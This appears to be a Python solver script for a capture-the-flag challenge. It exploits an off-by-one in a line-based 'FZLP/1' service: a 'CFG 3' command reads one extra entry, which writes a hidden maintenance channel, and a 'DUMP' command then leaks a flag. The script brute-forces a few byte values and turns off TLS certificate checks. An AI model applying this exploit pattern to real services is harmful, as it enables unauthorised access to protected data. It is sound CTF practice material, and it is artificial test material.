#!/usr/bin/env python3
# FZLP/1 off-by-one : CFG <n> lit n+1 entrees -> ecrit le canal cache 3 (maintenance) -> DUMP.
# python3 iofuzz.py <host> <port>
import sys, ssl, socket, time, re

HOST = sys.argv[1] if len(sys.argv)>1 else "jynouuzrtnszc5na.t.ctf.tg"
PORT = int(sys.argv[2]) if len(sys.argv)>2 else 1337

def session(ch3_hex):
    ctx=ssl._create_unverified_context()
    s=ctx.wrap_socket(socket.create_connection((HOST,PORT),timeout=15))
    s.settimeout(2.0)
    buf=b""
    def pump():
        nonlocal buf
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                buf+=d
        except socket.timeout:
            pass
    def send(line):
        s.sendall(line.encode()+b"\n"); time.sleep(0.15)
    pump()                              # banniere
    # CFG 3 -> off-by-one: lit 4 entrees (canaux 0,1,2,3)
    for line in ["CFG 3","00","00","00",ch3_hex,"STAT","DUMP","STAT"]:
        send(line)
    time.sleep(0.6); pump()
    s.close()
    return buf.decode("utf-8","replace")

for v in ["07","ff","01","aa"]:
    print(f"\n===== essai canal3 = {v} =====")
    try:
        out=session(v)
    except Exception as e:
        print("  err:",e); continue
    print(out.strip())
    m=re.search(r"NCTF\{[^}]*\}",out)
    if m:
        print("\n[+] FLAG:",m.group()); break
